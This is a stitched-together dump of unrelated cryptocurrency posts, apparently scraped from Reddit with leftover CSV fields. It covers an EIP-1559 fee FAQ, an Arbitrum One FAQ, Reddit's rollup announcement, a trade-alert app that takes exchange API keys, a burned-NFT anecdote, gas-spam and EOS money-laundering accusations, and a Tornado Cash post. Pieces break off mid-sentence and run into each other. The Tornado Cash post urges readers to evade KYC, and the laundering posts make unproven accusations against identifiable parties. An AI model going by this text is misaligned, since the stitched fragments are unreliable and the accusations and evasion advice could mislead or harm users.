rates being 2% during odd hours and 18% during even hours would have the same effect on all three of the above, as uncle rates always being 10%. Because EIP 1559 still bounds the long-run gas usage to a ~10 million per block average, it does not affect the long-term average.## How would a spike of high usage look like under EIP 1559 compared to the status quo?Consider a &#34;mathematically ideal spike&#34; (eg. this could happen in real life because of a sudden market event leading to many arbitrage opportunities on DEXes, bidding on liquidated CDPs, etc), where N * 10 million gas worth of transactions, each with a very very high gasprice, are all broadcasted.Currently, this would lead to the following situation:* The next N blocks are filled exclusively with new spiky transactions* After that other transactions, as well as transactions that people send after the spike, get included in descending order of gaspriceAn average &#34;normal user&#34; would have to wait more than N blocks.Now, consider the situation under EIP 1559:* The next N/2 blocks are filled exclusively with new spiky transactions, each with twice the normal amount of gas* If all other transactions get sent with a gas price cap equal to the old gasprice, then the next N/2 blocks would be empty, and after that things would revert to normal. But realistically, higher-priority transactions would set higher gas price caps and get included first, and other transactions later.An average &#34;normal user&#34; would have to wait somewhere between N/2 and more than N blocks.Hence, even including the post-spike &#34;recovery period&#34; during which block capacity would be smaller than normal, most transactions get included sooner.Here&#39;s a very rough simulation (there are lots of strange assumptions here, but modeling a full system that covers both supply/demand curves *and* waiting times is hard); spreadsheet source [here](https://docs.google.com/spreadsheets/d/1iid0PnO5UTMECW2RylVwEOECFbW5iWsJSHmP4zj7Lr4/edit?usp=sharing).### Status quo:(https://storage.googleapis.com/ethereum-hackmd/upload_3275cf10d6874f0837b08b17160231ee.png)### EIP 1559:(https://storage.googleapis.com/ethereum-hackmd/upload_a5b82e76e3e6820dbd6e1d117f034e17.png)## What would EIP 1559 do under larger and more prolonged spikes (eg. day-long spikes)Not much. The BASEFEE would rise and there would be a short period at the beginning where a few transactions get in faster, but after that the fee market would function just as it would under &#34;ordinary&#34; conditions, just at a higher fee level. The main benefit of EIP 1559 in spikes is that the harms from inefficiency of regular fee markets are magnified when fees are high, so having a functioning fee market becomes more important.## If the chain _can_ handle 2x block size spikes, doesn&#39;t that mean the chain can handle just making _all_ blocks 2x larger?No. See this post for why:https://notes.ethereum.org/@vbuterin/eip_1559_spikes## Why limit = target * 2? Why not 4? Or 8?It could easily be higher than 2. The higher the limit/target ratio the greater the fee market efficiency benefits of EIP 1559. It depends on how  severe the short term spikes are that we are willing to accept; 2x is fairly conservative. We could even launch EIP 1559 with a limit/target of 2 to start off, and increase it over time as we see the network functioning okay even under short-term spikes.## Why would miners include transactions at all?The EIP includes a &#34;tip&#34; that transaction senders can include, that goes to the miner. The tip has two functions: first, if there are suddenly far more transactions than expected, miners will include transactions with higher tips first, so the fee-based prioritization mechanism exists as a backup. Second, it compensates miners for uncle risk (the increased risk their block will not be included in the main chain because adding one more transaction will slow it down).The tip level that compensates for uncle risk has been calculated to be about 0.8 gwei (uncle blocks get on average a 1.67 ETH reward instead of the 2 ETH base, so that&#39;s a ~0.33 ETH = 330m gwei loss, 10 million gas blocks add ~0.025 to the uncle rate ckompared to empty blocks, so the expected cost of 1 gas is = 330m / 10m * 0.025 = 0.825 gwei) and miners do actually set about this value when the chain is empty.This tip level is independent of the BASEFEE, so client implementations can confidently set 1-1.5 gwei and expect their transactions to be accepted.## How might wallets choose tips? Is there a risk of bidding wars for tips?Wallets could simply choose tips by looking at what tips have been accepted on chain historically, and increasing their tip if they see that a transaction they send was not accepted immediately. Note that in &#34;normal conditions&#34; there is no incentive to set a tip higher than the bare minimum.In cases of sudden congestion, tips _do_ degrade into a bidding war; wallets can detect congestion, and in this case they could offer users the option of setting low or high priority for their transaction.## What is the escalator mechanism? How might the escalator mechanism be combined with EIP 1559?The escalator mechanism is a different proposed transaction fee reform, where instead of specifying a single fee, users specify their fee as a function, usually with a beginning, an increase-per-block and a maximum, for example &#34;5 gwei if this transaction is included in block 10123456, add 1 gwei for every block after that (eg. 8 gwei if included in block 10123459), up to a maximum of 100 gwei&#34;.This would be four parameters: beginning fee, beginning block, per-block increment, max fee.The goal is to be &#34;safer&#34; against mistakes in fee estimation, as if the fee turns out to be too low it would naturally rise over time until the transaction is included. In an EIP 1559 context, this could be used to set the tip. The fact that the tip would generally be in a constant range means that even a wallet using fixed parameters for the escalator would deliver reasonably good outcomes to users.## Won&#39;t miners have the incentive to collude to push down the BASEFEE by making all their blocks less than half full?In general, the effectiveness of such strategies is limited, because unless truly almost everyone colludes, a transaction not included in one block will get included will just get included in the next block and so the effect of this action on the long-run BASEFEE will be negligible.However, what miners _can_ do is a kind of &#34;monopoly pricing&#34;. Suppose transaction senders are willing to pay some extra fee to avoid getting delayed one block. Miners can refuse to include transactions that do not include some minimum tip `T`; they lose out on some fee revenue, but gain from senders increasing their fees if they value the extra probability you will be the next miner and include their transaction highly enough. This strategy is heavily tilted against the miner: they suffer the full cost of lost fee revenue, but gain only a small portion of the increased transaction fees that others send.Note that even if a miner using such a strategy is successful, they will increase other miners&#39; revenue more than it will increase their own revenue (as other miners free-ride on the higher tips due to your actions), so it is not a centralization vector.This will _not_ reduce BASEFEEs down to zero; rather, it will hit an equilibrium where BASEFEEs remain the bulk of the fee and tips take up the remainder. This is because unless miners are all colluding (in which case we have bigger problems), miners suffer the entire cost of not including transactions but gain only some of the benefit of tips being higher.**If the risk of miners deploying such a strategy is _still_ deemed unacceptably high, we can direct some (eg. 50%) of the revenue from EIP 1559 into a pool from which a small percentage is drained every block to be added to the miners&#39; block reward**; this ensures miners benefit from the BASEFEE being high, further reducing the gains from such an attack.Here is a proposed sketch of a change to the EIP to do this:* Define the account 0x35 as `FEE_SMOOTHING_BUFFER`, and define `FEE_SMOOTHING_CONSTANT = 8192`* Add an additional term to the block reward (added at the same time as the base block reward and uncle+nephew rewards). Let `smoothing_reward = FEE_SMOOTHING_BUFFER.balance // FEE_SMOOTHING_CONSTANT`. Transfer `smoothing_reward` wei from `FEE_SMOOTHING_BUFFER` to `block.coinbase`* After applying the block rewards, 1/2 of EIP-1559 fees from that block (rounding down) get added to `FEE_SMOOTHING_BUFFER`&#39;s balance. The remainder (ie. 1/2 rounding up) gets burned.Note that in a proof of stake context, it would be desirable to implement secret leader elections along with penalties for early revelation, to prevent validators from acquiring reputations as only accepting high tips and gaining the entire benefit of this themselves as transaction senders would know which validators are creating blocks soon.### Other resources* The original paper: https://ethresear.ch/t/first-and-second-price-auctions-and-improved-transaction-fee-markets/2410* ethresear.ch thread on Barnabe&#39;s simulations: https://ethresear.ch/t/eip-1559-simulations/7280* Tim Roughgarden&#39;s report: http://timroughgarden.org/papers/eip1559.pdf",False,"This is why EIP 1559 is good- and why Vitalik, developers and most community members support it.

Let's have a bit of an adventure and find out why shall we?Today, 40&#37; of the ethereum's network is being used by this contract [https://etherscan.io/address/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483](https://etherscan.io/address/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483) A beautiful and innovative copy-paste of a default ERC20 standard token called 'IFishYunYu' with no features. (So it does nothing.)Yet miraculously, it seems tons of 'unique' accounts are transferring massive volumes of this token constantly, almost 50 ETH of gas an hour have been steadily used for nearly 24 hours now. Just to transfer individual tokens to the Fcoin exchange. But of course. The exchange is just a red herring to distract you from what's really happening.Let's see what the creator of this contract has been up to recently. [https://etherscan.io/tx/0xd0e334dca734071f395cad64df90269113ead321232e5603f66fc6fb2885c654](https://etherscan.io/tx/0xd0e334dca734071f395cad64df90269113ead321232e5603f66fc6fb2885c654) Looks like he minted nearly 5 Billion Ifish tokens about 12 days ago... to this account 0x45f64a7148d1cfeded427dd4380b458877e7ce56 which split it up across 10 or so accounts, that each do this [https://etherscan.io/token/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483?a=0xcd4777b5f4d8779e99ea996bb32988daf0bbbf3b](https://etherscan.io/token/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483?a=0xcd4777b5f4d8779e99ea996bb32988daf0bbbf3b) splitting it up across 500-600 accounts each.Which are, the mystery 'unique' accounts that are spamming the eth network. So yeah, it's one guy, it's the creator of the token. He was doing it during the previous Fcoin exchange competition too. He's running a multi-sided scheme, he even has bots running 'wash' accounts. Like [https://etherscan.io/address/0xa67ef2aca4c6459e60821c1b1afe45812c4c1bcd#tokentxns](https://etherscan.io/address/0xa67ef2aca4c6459e60821c1b1afe45812c4c1bcd#tokentxns) which is pretty cool, it just shoves the token into other accounts, and then those accounts shove it into other accounts, and then back to the big main account to simulate volume on the token itself. Try following a transaction, you'll come right back to the big-daddy account.most importantly on why is this being done? Let's see what one of the accounts funding all this eth might be doing [https://etherscan.io/token/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0?a=0x7a717e226a8b37b912d0effbb0aab24ab690dbdb](https://etherscan.io/token/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0?a=0x7a717e226a8b37b912d0effbb0aab24ab690dbdb) gee, that sure is a lot of crowdfunded EOS, hundreds of thousands to be exact. From an account that seems to receive large sums of eos and immediately market sell them for thousands of ETH, which is then distributed out to contracts like this. Contracts that have been pulling this kind of transaction attack consistently across the ETH network.[(Lastly, they finished it with a fresh OC image of Vitalik in sunglasses that should exist if they don't already)](https://imgur.com/a/CzfUMXh)Credit: '[Team JUST discord'] (Developers of P3D and Fomo3D, the two highest volume decentralized games on ETH right now, so gas is hitting the community hard)",False,Manipulated ETH network gas prices look connected to EOS funded bot accounts in possible indication of corporate network attack.,u/[deleted],1,834,0.94,https://www.reddit.com/r/ethereum/comments/8yvlis/manipulated_eth_network_gas_prices_look_connected/,[]

There's a way to access your wallet using just your private key on the MEW platform without logging in (tho it's not recommended).

Bridging instructions here:  [Arbitrum Bridge](https://bridge.arbitrum.io/) Arbitrum One, in my opinion, is the most important smart contract platform release since Ethereum in 2015. Here are some details.**What is Arbitrum One?**Arbitrum One is a smart contract chain. It's just like Ethereum, has similar security properties to Ethereum, except it's much faster and cheaper.If you want to dive into the technical details, Arbitrum One is an optimistic rollup. Here's a [great video explaining how optimistic rollups work](https://www.youtube.com/watch?v=7pWxCklcNsU). For an even deeper dive, see [Inside Arbitrum](https://developer.offchainlabs.com/docs/inside_arbitrum). For the normie user, this doesn't matter. All you need to know is it's a faster and cheaper version of Ethereum.**What's the difference between Arbitrum and Arbitrum One?**Arbitrum is the brand, Arbitrum One is a specific rollup chain. Reddit will have their own chain using Arbitrum technology.**How fast is Arbitrum One?**Transactions confirm within a second, so as close to instant as you can get! Really, most of this is latency is between your internet connection and Arbitrum One.**How cheap is Arbitrum One?**Gas fees will be anywhere typically between 90%-95% cheaper than Ethereum. So, if a transaction costs $20 on Ethereum, it'll cost anywhere between $0.40 and $2 on Arbitrum One. The exact number will depend on the type of transaction and the gas prices on Ethereum. As Arbitrum One matures, fees will lower over time.**Boo! That's not cheap enough!**I hear you. While 90+% cheaper than Ethereum is a tremendous improvement, and will be cheap enough for many, many more users, it's not enough for everyone.Some may be wanting transaction fees in the $0.01 range. This will happen as Arbitrum One matures, and data shards release on Ethereum. It'll take a couple of years to realize the vision for global scale.In the here and now, you'll have to use a sidechain like Polygon PoS - but be aware that it's far, far less secure or decentralized than Arbitrum One or Ethereum, so what you save in fees, you pay for in security. We will also see intermediate solutions over the coming months like validiums e.g. zkPorter and Immutable X, which offer sidechain-like fees, but far better security.**When can I use Arbitrum One?**August 31st!**How do I use Arbitrum One?**The same way use Ethereum! If you have used Ethereum sidechains like Binance Smart Chain, Polygon PoS, or Avalanche, you'll know exactly how this works.The [Arbitrum One Portal](https://portal.arbitrum.one/) will be a great place to get started.Go to [Arbitrum (ETH) Blockchain Explorer (arbiscan.io)](https://arbiscan.io/) '- which is the Etherscan for Arbitrum. At the bottom, you'll see 'Add Arbitrum Network'. This will add Arbitrum One to the web3 wallet of your choice (e.g. MetaMask). From there, you use the same address as you do on Ethereum, the same wallets, same everything.Alternatively, the web UIs for your favourite dApps will also likely have options to switch to Arbitrum. For example, [Uniswap has a guide for Optimism, something very similar will be live for Arbitrum One too](https://help.uniswap.org/en/collections/3033942-layer-2).**How do I send my tokens to Arbitrum One?**You can bridge your tokens to Arbitrum One using the [default gateway](https://bridge.arbitrum.io/).In addition, you will have multiple liquidity bridges like Hop Protocol, Celer cBridge, Connext and Biconomy that will not only allow you to bridge tokens between Ethereum, but also other chains like Polygon, Optimistic Ethereum etc.Furthermore, major CEXs like OKEx, Huobi and Coinbase have committed to offer direct withdrawals to Arbitrum One. So, you'll never have to use Ethereum and can totally bypass the high fees there! Of course, it'll take some time for all of this infrastructure to mature, but it's happening.**What can I use on Arbitrum One?**One of the reasons I call Arbitrum One the most important smart contract chain release since Ethereum is because of its [expansive developer adoption](https://www.reddit.com/r/ethereum/comments/p4qanm/arbitrum_one_has_the_greatest_developer_adoption/). Most of the bluechip projects - Uniswap, Chainlink, Maker, Aave, Curve - you'll find them on Arbitrum One from day 1! There are over 400 projects set to release on Arbitrum One, with many more live over the coming weeks. Nowhere will you see such a vibrant ecosystem of top tier dApps outside of Ethereum itself.**How do I pay fees on Arbitrum One?**You pay fees in ETH! No friction, no needing to buy a random token to pay fees.**OK, sounds good, but I can't find Arbitrum on Coingecko?**Arbitrum does not have a token. You just use ETH. I presume this is why it's so underhyped and underrated.**What are the caveats?**Long term, there's only one major caveat - withdrawing your tokens from Arbitrum back to Ethereum takes 7 days. However, you can easily use the liquidity bridges or CEXs to withdraw instantly. It's not suitable for NFTs, though - we'll see NFTs adopted on zkRollups like zkSync, Immutable X and Loopring instead which don't have this caveat. In the future, I expect Arbitrum will also offer zkRollup solutions.Short term, there are many caveats that you must be aware of. Arbitrum One is launching with multiple training wheels - there are multiple centralized aspects to Arbitrum One, chiefly upgradable L1 contracts and centralized sequencer. It's also cutting-edge tech, and there may be bugs and vulnerabilities. Only ape in with money you're willing to lose. However, all of these will be mitigated in the coming months as Arbitrum's top priority is progressive decentralization and general protocol maturity.Bonus questions:**What if Arbitrum One is congested?** (b**y** u/newtosh, u/fiah84)Arbitrum One uses an EIP-1559-like mechanism, where the transaction fees will start rising if it gets congested.**Running another fast chain like Arbitrum One can't be very cheap, do you know how offchain labs plans to monetize it?** (by u/fiah84)When Arbitrum One scales past Ethereum, it'll definitely be much more expensive to run an Arbitrum One node than Ethereum. Fortunately, because it leverages Ethereum's security, it's acceptable for Arbitrum One to be more expensive as you need much fewer nodes running (one honest sequencer and one honest validator is enough, but for resilience there'll be a few dozen, instead of thousands). End users can always verify directly from Ethereum - as all the transaction data is present in compressed form. Long-term, they can also use techniques like state expiry / regenesis to keep their nodes running efficiently - there's always a fallback state available for reconstruction from Ethereum.As for monetization, when you pay transaction fees on Arbitrum, a portion of it goes to Arbitrum, the rest is paid to Ethereum for security and data availability. That's how the network monetizes itself. Also, I'll note that Offchain Labs are working on decentralizing Arbitrum One, so the transaction fees will go to the network - sequencers and validators, possibly even a treasury - not just Offchain Labs. The exact mechanism for how the revenues will be decided as the network decentralizes.**So fees will go to validators and other machines that help run the chain. Will it be possible to set up and run servers for profit and supporting the arbitrum chain?** (by u/pikag)For the first part, see above. Without going into too many details, yes, you'll be able to run sequencers once decentralized, though the details are pending. Also, there are validators, but these are specialized roles quite unlike validators on L1s. You can read about the [details here](https://developer.offchainlabs.com/docs/inside_arbitrum#validators).**Is this a centralized or decentralized solution? What happens when Arbitrum as an org, goes under?** (by u/benaffleks)In the short term, it's a semi-de/centralized solution. However, this is entirely due to it being brand new tech, and training wheels required.Offchain Labs is focused on progressive decentralization, so in the future, it'll be a fully decentralized solution. Even if Arbitrum One fails, as a decentralized solution, you can still exit with your funds directly from Ethereum L1 - this is why we say it's materially as secure as Ethereum.**Given that the sequencer will be centralized at release, isn't there a risk that Arbitrum do not process certain transactions like withdrawals and your funds get stuck?** (by u/ZougTheBest)Different rollups have different exit mechanisms if the sequencer censors you. Arbitrum was initially designed without a sequencer model - it was actually one of the last things to be added. As a result, Arbitrum has one of the simplest ways to exit: you can bypass the sequencer and submit your transactions [directly to the regular inbox](https://developer.offchainlabs.com/docs/inside_arbitrum#if-the-sequencer-is-malicious).**Can you build a rollup on top of a rollup? Could this make cheaper transactions in case sharding never happens?** (u/Datacruncha)No, but you can have multiple rollups in parallel. There's a reason why it's called Arbitrum **One**! Indeed, next up will be Arbitrum Reddit - or whatever they call it. This won't reduce transaction fees significantly overall. What will is massively greater data availability on Ethereum when data shards release, as covered above.**With all these rollups competing there is going to be fractured liquidity among them right? Any solution to this? (by** u/Phenozd)Yes, but in reality, the situation is nuanced. The lower fees and higher transaction throughput will simply onboard new users and new liquidity that didn't exist before, so it's a net gain. Multiple projects are working hard on interoperability between rollups, and we have brilliant solutions like [dAMM](https://medium.com/starkware/damm-decentralized-amm-59b329fb4cc3) being developed that lets zkRollups share liquidity! Note: dAMM won't work with Arbitrum One - only zkRs.'---If there are any more questions, feel free to ask, I'll add them in here to the best of my knowledge!

The term includes a monetary unit of account established by an intergovernmental (16)organization or by pursuant to an agreement between two or more countries. The term does not include an (17) electronic record that is a medium of exchange recorded and transferable in a system that existed and operated (18) for the medium of exchange before the medium of exchange was authorized or adopted by the government.This year similar bills were successfully vetoed by Kristi Noem in SD, and AZ killed it as well. But other states aren't so lucky. We all need to fight these kinds of bills. We will not be able to do all the good we want or be our own bank. I suggest you find some watchdog groups in your state. One of the watchdogs in my state sent out a big alert. Take action in your state.While the banking industry is burning (by design) to introduce CBDC...they are busy making sure we are stuck in their rigged system.The language of the bill basically says that when the government says the dollar is invalid, and there is something to replace it, then that's final an no one can resist it.They are implementing it on a state level so there will be no wiggle room.Montana's bill is SB 370 and OPPOSE. If you do take action and call or email the committee, please be respectful and courteous.

THE WEBSITE OFFERS THE SAME FEATURES AS THE MOBILE APP (FOR ALL YOU NON IPHONE USERS!) AS WELL AS INSTRUCTIONS HOW TO SET UP THE ALERTS LOCALLY ON YOUR OWN MACHINE IF YOU DO NOT TRUST THE APP (WHICH I FULLY UNDERSTAND). ALL FUTURE UPDATES WILL FIRST BE DEPLOYED ON THE WEBSITE AND LATER THE IOS APP**http://cointradealerts.com**I want to make sure you all know from the start this is 100% free to use. There are no advertisements/monetization whatsoever. I built this because it's something that I've been using for a few months and thought that I could strengthen my personal skill set and build out for others to enjoy.**http://cointradealerts.com/https://itunes.apple.com/us/app/coin-trade-alerts/id1329306758?ls=1&mt=8It's a pretty simple app really. You create a view only API key, plug it into the app, add your phone number, and then you never have to open the app again. It will send you a text message when your orders fill. (It will work for all GDAX products)Here's exactly how it works:1) Generate **view only** API key (this allows the app to read your completed orders).2) Provide your phone number/carrier (so I can build your contact email i.e 123456790@txt.att.net)3) The app will make a request every 60 seconds and record the number of completed orders you have in a database. Every time it checks, it will see if there's a difference in the numbers. If there is, it will build a message with information from that many of your most recent fills (something like buy: X TICKER at $Y total: $Z)I originally wrote most of the backend Python of this a few months ago and I've been running it on my Raspberry PI and sending me a text when my limit orders fill. The main reason why I wrote this is because I thought it was something crucial that other services didn't offer, and being a Software Engineer I could do quite easily. A bunch of my coworkers who were also into trading cryptocurrency on GDAX really wanted to use it so initially I was just giving them the code but then I decided that since i've always wanted to have an app under my name on the App Store and learn Swift, this would be the perfect opportunity.I have all of the code publicly visible on my Github [HERE!](https://github.com/leggio/CoinTradeAlerts) The backend API is a flask web server running on an AWS EC2 Instance. The Database is an AWS RDS MySQL database. I've been using Flask for about 2 years and I never really thought that it could be practical for iOS development. It really surprised me how well it worked.______________________________________________________________________________Although my code is publicly visible and I am only reading your completed orders, there is obviously a trust level required on your end to give me the API key. Nobody here knows who I am and I fully understand that!**If you provide anything more than VIEW ONLY your API key CAN be used to transfer your money/coins and steal them.**If anyone does not feel comfortable doing so, you are more than welcome to use [the previous version](https://raw.githubusercontent.com/leggio/Cryptocurrency/master/Fill_Tracker.py) of this code and run it locally on your machine. This means that you are entering your API credentials locally on your own machine.I am in the process of building out the website, which will include instructions as to how to do the above, as well as provide the same (and more!) functionality that the app does. The website should come out with the base features in a few days and will allow people who don't have iPhones to utilize this tool!______________________________________________________________________________**I originally posted about this on /r/litecoin and /r/bitcoin yesterday and received such overwhelming support that it was crashing the backend web server of my application. Today I was able to get this sorted out and nobody should experience any problems!**______________________________________________________________________________Additionally, I received a lot of great feedback from you guys, which is why I spent quite a few hours yesterday/today building a brand new website that will offer the exact same functionality as the mobile app, but in your browser! I plan on deploying in the days to come. I will be adding all user requests to the website as well.What's currently on my todo list: 1) Security alerts!

It's the first time that the US directly attacks a smart contract.With their actions they have demonstrated that they know better our vulnerabilities than what we thought. But this demonstration of power can teach us how they are going to proceed in future attacks, which for sure are going to come as the Ethereum network starts taking away a big share of the financial system.From the experience of this attack we can see that the principal point of failure in the current system is all of the non-decentralized platforms and protocols that are not required but essential to make the network work. I'm going to enumerate them and some possible solutions to the problems:* **RPC's**: it doesn't make sense to have a 100% decentralized system if the channel that you use to connect to it is 100% centralized. We need to start using by default in our wallets decentralized RPC's. Unfortunately this is not easy, as running a full node requires a lot of hardware requirements. Fortunately we'll soon have light clients which will enable us to query and validate the network with little resources.* **DNS**: dapp's must have a frontend deployed on IPFS (with a decentralized pinning service like Filecoin) accessible with a .eth domain. But this is not enough! as currently the DNS translation is done using centralized RPC's. When light clients are available, browsers will need to use them as the default DNS resolver.* **GitHub:** I wouldn't have ever imagined that this could pose a threat to Ethereum security but as we saw it's a significant point of failure. **All the DAPP's code must be always accessible** in a decentralized, global, searchable place, with a nice UI to interact with it. Currently there are two projects aiming at solving this problem: [radicle](https://radicle.xyz/) and gitopia.* **USDC/TETHER:** we already knew this but it is good to remember the risk that this kind of stablecoins generate. Fully decentralized stablecoins don't exist, but DAI and FRAX are a significantly better option as not 100% of its collateral comes from assets outside of the chain.* **Metamask:** there has not been any problem with it, but as a closed source software and critical part of most of the Ethereum transaction we should take it into consideration. A project aiming to solve this problem is [tally](https://tally.cash/), they are fully open source and they have a DAO, although their product doesn't have as many features as Metamask yet.* [**localcryptos**](https://localcryptos.com/) **> Coinbase:** last but not least. Even if all the previous measures are implemented correctly it is going to be of no use if the government prohibits citizens from using a dapp. Wallets should be anonymous from the first time that users get into crypto so the government can't impose their regulations on the users, so stay anonymous and evade KYC.And that's all, hopefully with measures like this and more that will come we'll be able to build a better future.A developer.&#x200B;Full article: [https://medium.com/@pabloturnes/the-tornado-cash-opportunity-3a65d5f231cf](https://medium.com/@pabloturnes/the-tornado-cash-opportunity-3a65d5f231cf)",False,The tornado cash opportunity.

Today we are deploying a new Layer-2 rollup using Arbitrum technology. We will be testing this scaling network on top of Rinkeby, before migrating to the Ethereum mainnet.**'*'*'*Hello Ethereum world! Last year, we launched [Community Points](http://reddit.com/community-points) ‚Äì¬†tokens on Ethereum that give more ownership and control back to users through decentralized technology. Soon after, we invited the crypto community to a [Scaling Bake-Off](https://www.reddit.com/r/ethereum/comments/hbjx25/the_great_reddit_scaling_bakeoff/) to help figure out how to bring Community Points to the Ethereum mainnet. As we evolve these efforts, we're continuing to work towards our commitment to blockchain, helping to accelerate scaling and resources for the Ethereum ecosystem and bringing the value and independence of blockchain technology to more communities and millions of redditors.  Now onto the exciting Bake-Off news...we were deeply impressed by the breadth and quality of the projects that participated in the competition. Thanks to all your hard work, there has never been a more exciting time to be building on Ethereum!After significant research and in-depth reviews of multiple projects, we found [Arbitrum](http://arbitrum.io/)'s optimistic rollups to be the most promising scaling technology for Community Points. Today, we are launching our own Layer-2 rollup using Arbitrum technology. We will be testing this scaling network on top of Rinkeby, before migrating to the Ethereum mainnet.As we did our research, it was clear that different scaling solutions fit different needs. For us, there are multiple features that make Arbitrum stand out:* **It's decentralized.** Arbitrum derives its security and finality from the base chain. No centralized actors or bridges, which means users are always the ones in control of their Community Points and other blockchain assets, not anyone else.* **It's developer-friendly.** Arbitrum supports the same Solidity smart contracts and the same toolchain as Ethereum. Developers can launch apps on top of Community Points on this network as easily as they can on Ethereum.* **It has broad ecosystem support.** [Many](https://twitter.com/haydenzadams/status/1397675095708086273?s=20) [large](https://twitter.com/chainlink/status/1398438140969377792) [projects](https://offchain.medium.com/etherscan-is-coming-to-arbitrum-4f41edaff100) are launching on Arbitrum, outside of us. A big ecosystem brings together the tools and infrastructure to keep things growing even further.We have been working closely with [Offchain Labs](https://offchainlabs.com/), the team behind Arbitrum, and we are excited to take our collaboration to the next level. We've been impressed by the quality of their work, the maturity and thoughtfulness of the team, and the progress they've made on bringing optimistic rollups to production. We look forward to continuing to work with them and the [Ethereum Foundation](https://www.reddit.com/r/ethereum/comments/l6c3kx/reddit_announces_partnership_with_the_ethereum/) to bring Ethereum to Reddit-scale production in ways that will benefit the entire ecosystem.Today's launch is a big step forward, but our work is far from done. Our goal is to cross the chasm to mainstream adoption by bringing millions of users to blockchain. If you are a top-notch engineer who wants to build a more decentralized Internet at Reddit-level scale, we [want to work with you](https://boards.greenhouse.io/reddit/jobs/2790178)!

It's the only full set available on Opensea that I know of.    I did a second vault with only 4 cards, including a satoshicard and an FDcard- two of the rarest cards in existence, and listed them for sale.  HOWEVER-  In the description of the second vault, I listed some erroneous information about FDcard, stating that it was not divisible like the Satoshicard.

So I created the second vault, but then once it was created I noticed there was a small grammatical error (I repeated a phrase).  I hadn't put any cards in it yet, and the error bothered me, so I decided to just send that vault to the burn address and do it again.  So I did.  I then created the third vault, and got the text just how I wanted.  Then I went to fill this new vault with the cards, and this is where I F'*'*ed up.  I apparently still had the tab open on emblem finance for the burned vault, and I took the BTC address from that one rather than the newest one.  Each card that I sent I checked and rechecked to make sure the address matched, which it did... but the vault was in the burn address.  So I sent away-  a Satoshicard, an FDcard, a Satoshilite, and and Ethereumcard.  One by one the transactions confirmed.  And my vault remained empty.  Refresh refresh refresh.... nothing.  It must be a bug, I said.  But then I pulled up the address on the counterparty explorer, and all 4 cards were there.  And then the possibility of the worst case scenario leaked into my brain, and I rejected it.  I had triple checked!  But, I looked at the burn address account on opensea, and there it was.  'My' vault, and 'my' cards.[Here they are](https://opensea.io/assets/0x82c7a8f707110f5fbb16184a5933e9f78a34c6ab/31233817437325701) if anyone wishes to pay their respects.  'Fewer complete cards complete cards....'  They have now been sacrificed to the Gods of Stupidity.  I'm very happy that it was the 4 set rather than the full set.  I can only look on the bright side and realize that there are now 198 Satoshicards and 299 FDcards in existence, so my other cards are more rare.  And maybe I have a tax writeoff?

Massive amounts of ether sent daily from wallets that only interact with EOS contract---This was the first sign that tipped me off. The following accounts are sending hundreds of thousands of dollars to EOS every week. These accounts look like they were created before the contract and have only been used to buy from the contract, then send the funds to different exchanges. (There are plenty more, these are just the accounts I found within the last 10 pages and the first 2 pages of the Contract)* https://etherscan.io/txs?a=0x1ecf0b798ebb43477b5c657963332d640871a0ec&p=1* https://etherscan.io/address/0x2808c13b7b81c6fdcfb10ed6f158b84a3284d68f* https://etherscan.io/address/0x1869e05f92ba2e0d71e9da71713c8672a18ea923* https://etherscan.io/address/0x4e8c49fab23532ef2ed14058639f55cf45bade1e* https://etherscan.io/address/0x720081be885c6c0de4d1c7f8ed0e3b284010e20b* https://etherscan.io/txs?a=0x3d4211b8fd39b1fecafb27f707b23dc36b7e18bc&p=9* https://etherscan.io/txs?a=0x1ecf0b798ebb43477b5c657963332d640871a0ec&p=1All of these accounts ONLY interact with the EOS contract, they get funds from exchanges, and immediately send the EOS off to the exchange. ---2.The 1 Billion Dollar ICO---More like 1 Billion dollar money laundering scheme. We all know the creator of EOS has been in the crypto world for a very long time and as such has a lot of BTC and ETH, BTS, and all his other coins he has made during his time. Let me lay out a scenario for you and you tell me what you think:1. Start ICO with unlimited cap2. Funnel existing cryptos into your own ICO3. Get your funds back....since you own the ICO4. Get Tokens as well5. Sell Tokens6. Send BTC/ETH from tokens you just sold back to get more tokens7. Repeat at step 2. This scheme can go on forever, or until the token your buying goes to 0.00. Yet EOS is currently .60 cents. Meaning if I owned the contract, I can continually send money and create more money out of thin air. ICOs are capped - not because its 'normal' but because it prevents fraud. If you don't cap the crowdsale, there is no prevention against fraud. Even with a capped crowdsale there is a chance of fraud, but its economically less viable the more you do it.This is why other ICOs are not considered money laundering, there will be a point where your just buying your own tokens and its pointless. But if its uncapped, as long as the token has ANY market value (even .000001 cents) you can still make a profit doing this fraud. This is why ICO limit the amount of money they are bringing in, because if they did not set caps, there would be no way in knowing if the company bought all of their tokens themselves, or if it was a genuine firesale. While it may not be the case that EOS are COMPLETELY a money laundering operation, I see this as a very high statistical probability. Maybe they are not running the EOS sale with 100% intentions for laundering all their crypto, but it is definitely taking place. This is proven by the fact that there are accounts that were created around the tme of the creation of the EOS contract and ONLY interact with that contract. Can someone who has more capabilities than me, please look into this? These are accounts created only for EOS contract buys, the tokens are constantly been moved, if there are rumors that the creator is a scam artist within the community, so should the SEC/FBI be involved here? Also can someone explain the interactions that are going on between 0x000000... address and the others? Why does a null/dev/orginial address have so many ICO tokens and is constantly active? EDIT: Not trying to spread fud or make any claims, I'm just bring attention to what I found and hope someone can explain it, I don't own, nor will I ever own any EOS tokens. I just actually want answers. If anyone has information that I am missing, please share it! I'm hoping I'm wrong!

The first to come with a solution was a Russian-Canadian developer Vitalik Buterin, who submitted the Ethereum concept to the crypto community in late 2013. After a successful crowdfunding in 2014 the platform went live by July 2015.The major innovation of Ethereum that distinguished it from Bitcoin was a wide range of possible **smart contracts** that could be coded on its blockchain. A smart contract is basically a computer program registered on a blockchain that is executed by the EVM (Ethereum Virtual Machine) when a transaction is sent to its address; the results of a program execution are themselves being stored on a blockchain. The **DApps** (decentralized applications) using these smart contracts enjoy all security and independence benefits of a blockchain: program execution is entrusted to a decentralized network instead of a single third party.## Ethereum consensus and feesIn order to incentivize Ethereum nodes to run smart contracts, fees are paid for every transaction. **These fees are paid in a special unit called gas and depend on the amount of computations to be done**. Gas can be bought with Ethereum native currency Ether (ETH), the price being decided by the market according to the supply/demand ratio. Ethereum uses a Proof-of-Work consensus, like Bitcoin, although it has some specificities of its own: hashing function is Ethash and a block is 